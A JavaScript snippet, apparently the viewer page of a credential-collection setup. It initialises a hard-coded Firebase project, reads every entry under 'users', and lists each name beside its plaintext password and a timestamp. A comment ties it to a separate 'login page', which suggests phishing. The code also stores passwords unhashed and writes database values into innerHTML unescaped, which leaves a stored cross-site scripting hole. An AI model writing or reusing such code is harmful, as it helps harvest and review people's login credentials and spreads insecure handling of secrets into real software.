 // Firebase configuration (must match your login page config)
        const firebaseConfig = {
            apiKey: "AIzaSyCpbb9kKDgD3sly6hjSe1I55mIlqKsa5JM",
            authDomain: "systeam-d12d0.firebaseapp.com",
            databaseURL: "https://systeam-d12d0-default-rtdb.firebaseio.com",
            projectId: "systeam-d12d0",
            storageBucket: "systeam-d12d0.appspot.com",
            messagingSenderId: "938749422010",
            appId: "1:938749422010:web:097e3432289f20ac3fd583",
            measurementId: "G-FC1TNMV0SH"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fetch and display data
        database.ref('users').on('value', (snapshot) => {
            const tableBody = document.getElementById('tableBody');
            tableBody.innerHTML = ''; // Clear previous data

            if (!snapshot.exists()) {
                tableBody.innerHTML = '<tr><td colspan="3" style="text-align: center;">No data found</td></tr>';
                return;
            }

            snapshot.forEach((childSnapshot) => {
                const data = childSnapshot.val();
                const row = document.createElement('tr');
                
                row.innerHTML = `
                    <td>${data.name || 'N/A'}</td>
                    <td>${data.password || 'N/A'}</td>
                    <td class="timestamp">${formatTimestamp(data.timestamp)}</td>
                `;
                
                tableBody.appendChild(row);
            });
        }, (error) => {
            console.error("Error fetching data:", error);
            document.getElementById('tableBody').innerHTML = `
                <tr>
                    <td colspan="3" style="text-align: center; color: red;">
                        Error loading data. Check console for details.
                    </td>
                </tr>
            `;
        });

        function formatTimestamp(timestamp) {
            if (!timestamp) return 'N/A';
            const date = new Date(timestamp);
            return date.toLocaleString();
        }